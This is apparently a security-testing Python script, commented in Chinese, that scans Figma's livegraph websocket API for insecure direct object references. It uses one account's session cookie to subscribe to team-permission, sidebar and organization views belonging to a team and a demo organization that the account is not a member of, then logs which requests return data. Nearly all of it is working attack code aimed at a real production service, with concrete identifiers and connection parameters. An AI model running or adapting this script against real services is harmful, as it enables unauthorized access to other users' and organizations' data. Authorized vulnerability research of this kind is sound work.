"""B 登录态 → 非 B 的 org/team 维度视图批扫(IDOR):
目标:TeamPermissions/CurrentTeamCombinedPermissions/OrgByIdForPlanView 等
用 A_TEAM(A 的 team,B 非成员)与 DEMO_TEAM/DEMO_ORG(对照)"""
import sys, json, asyncio, io, re
import websockets
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

CAT = json.load(io.open('lg_views_catalog.json', encoding='utf-8'))
A_TEAM = "1666382706663462213"
DEMO_TEAM = "1484993099407069875"
DEMO_ORG = "1484997479016537761"
PUB = "bv2nMIdFf4u3dESGail4sm"
B_UID = "1667396392129259941"
B_ANON = "e101e166-c8ed-43ac-bb3e-89903f418397"
COMMIT = "aeddb9472f99bd8829192d4263f27d7a6d5cef8e"
CK_B = io.open('ws_cookie_B_new.txt', encoding='utf-8').read().strip()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"

def lg_url(client_url=PUB):
    return (f"wss://www.figma.com/api/livegraph?pv=1&pr=dad80c10603319f8&pt=1786432687"
            f"&ph=dnoflh97wkg6_cF_nypMbd9rtfZmF2KhdefK4gshdaM"
            f"&userId={B_UID}&anonUserId={B_ANON}"
            f"&clientType=web&commitHash={COMMIT}"
            f"&preload=%7B%7D&requestedProtocolVersion=2"
            f"&clientUrl=https%3A%2F%2Fwww.figma.com%2Ffile%2F{client_url}"
            f"&connectionType=initial&reconnect=0")

def auth(client_url=PUB):
    return {"messageType": "auth", "clientType": "web",
            "args": {"userId": B_UID, "anonymousUserId": B_ANON},
            "tags": {"clientType": "web", "commitHash": COMMIT,
                     "clientUrl": f"https://www.figma.com/file/{client_url}"},
            "clientRequestedVersion": 2}

async def sub(label, view_name, args, wait=12):
    frames = []
    try:
        async with websockets.connect(lg_url(),
                                      additional_headers={"User-Agent": UA, "Cookie": CK_B,
                                                          "Origin": "https://www.figma.com"},
                                      max_size=50_000_000, open_timeout=15) as ws:
            await ws.send(json.dumps(auth()))
            for _ in range(3):
                msg = await asyncio.wait_for(ws.recv(), timeout=8)
                if isinstance(msg, str) and "authSuccess" in msg:
                    break
            h = CAT.get(view_name, {}).get("hash", "ab" * 16)
            await ws.send(json.dumps({"messageType": "subscribe", "viewName": view_name,
                                      "viewHash": h, "loadType": "initial", "args": args}))
            deadline = asyncio.get_event_loop().time() + wait
            while asyncio.get_event_loop().time() < deadline:
                try:
                    msg = await asyncio.wait_for(ws.recv(), timeout=3)
                    if isinstance(msg, str):
                        frames.append(msg)
                except asyncio.TimeoutError:
                    break
    except Exception as e:
        print(f"[{label}] ❌ {type(e).__name__}: {str(e)[:90]}")
        return
    hits = [f for f in frames if '"initial":' in f or 'viewSubscriptionFailed' in f]
    total = sum(len(f) for f in hits)
    print(f"\n[{label}] 帧={len(frames)} 有效={len(hits)} 有效总B={total}")
    for f in hits:
        if 'viewSubscriptionFailed' in f:
            print(f"  🚫 {f[:250]}")
        else:
            # 提取数据实体种类
            kinds = set(re.findall(r'"([A-Za-z]+)":\{"queries"', f))
            initial_vals = re.findall(r'"initial":\{', f).__len__()
            print(f"  🖼 {len(f)}B 实体={sorted(kinds)} initial数={initial_vals}")
    if not hits:
        for f in frames[:1]:
            print(f"  · {f[:250]}")

async def main():
    print("======== B 登录 → 非 B org/team 维度 ========")
    # A 的 team(B 非成员)⭐
    await sub("TeamPermissions→A_TEAM ⭐", "TeamPermissions", {"teamId": A_TEAM})
    await sub("CurrentTeamCombinedPermissions→A_TEAM ⭐", "CurrentTeamCombinedPermissions", {"teamId": A_TEAM})
    await sub("FileBrowserSidebarData→A_TEAM ⭐", "FileBrowserSidebarData",
              {"currentOrgId": None, "currentTeamId": A_TEAM})
    # Demo(B 非成员)对照
    await sub("TeamPermissions→DEMO_TEAM", "TeamPermissions", {"teamId": DEMO_TEAM})
    await sub("CurrentTeamCombinedPermissions→DEMO_TEAM", "CurrentTeamCombinedPermissions", {"teamId": DEMO_TEAM})
    await sub("OrgByIdForPlanView→DEMO_ORG", "OrgByIdForPlanView", {"orgId": DEMO_ORG})
    await sub("OrgByIdForPlanUserView→DEMO_ORG", "OrgByIdForPlanUserView", {"orgId": DEMO_ORG})
    await sub("LibraryOrgSubscriptions→DEMO_ORG", "LibraryOrgSubscriptions", {"orgId": DEMO_ORG})
    await sub("LibraryTeamSubscriptions→A_TEAM", "LibraryTeamSubscriptions", {"teamId": A_TEAM})

asyncio.run(main())
